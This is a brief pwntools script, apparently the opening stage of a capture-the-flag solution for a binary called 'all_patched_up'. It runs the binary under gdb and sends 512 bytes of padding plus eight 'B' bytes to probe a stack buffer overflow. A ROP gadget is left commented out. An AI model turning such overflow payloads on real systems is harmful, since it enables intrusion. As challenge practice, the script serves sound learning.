#!/usr/bin/python3

from pwn import *

binary_path = "./all_patched_up"
# libc_path = '/path/to/libc.so'
libc_path = "/lib/x86_64-linux-gnu/libc.so.6"

gdb_args = '''
continue
'''

# p = process(binary_path)
p = gdb.debug(binary_path, gdb_args)

binary = ELF(binary_path)
libc = ELF(libc_path)

# pop rdi; ret
# POP_RDI = 0x0000000000023b6a

offset = 512

payload = b""
payload += b"A" * offset
payload += b"BBBBBBBB"

p.recvuntil(b">")
p.sendline(payload)

p.interactive()